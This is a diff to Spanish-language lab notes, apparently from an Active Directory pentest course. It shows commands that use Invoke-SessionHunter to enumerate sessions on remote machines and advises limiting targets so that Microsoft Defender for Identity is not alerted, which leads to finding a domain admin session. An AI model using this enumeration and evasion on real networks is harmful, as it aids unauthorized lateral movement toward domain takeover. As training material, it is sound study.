@@ -371,4 +371,27 @@ winrs -r:dcorp-ci cmd
 Actualmente tenemos acceso a dos usuarios de domio *student97* y *ciadmin* y acceso administrativo a la maquina *dcorp-adminsrv*
 
 ## Enumeración
-Mediante Invoke-SessionHunter podemos listar las se
+Mediante Invoke-SessionHunter podemos listar las sesiones en todas las maquinas remotas sin requerir permisos de administrador
+```shell
+[studen97]
+. C:\AD\Tools\Invoke-SessionHunter.ps1
+```
+
+```shell
+[student97]
+Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
+```
+
+Para que la ejecución sea mas compatible con la seguridad operativa y evitar activar herramientas como MDI, se pueden consultar maquinas objetivo especificas. Para ellos usaremos el siguiente archivo
+```shell
+[student97]
+cat C:\AD\Tools\servers.txt
+```
+
+Ahora podremos ejecutar el SessionHunter pasándole una lista de maquinas especificas
+```shell
+[student97]
+Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
+```
+ 
+Vemos que hay una sesion de administrador de dominio 
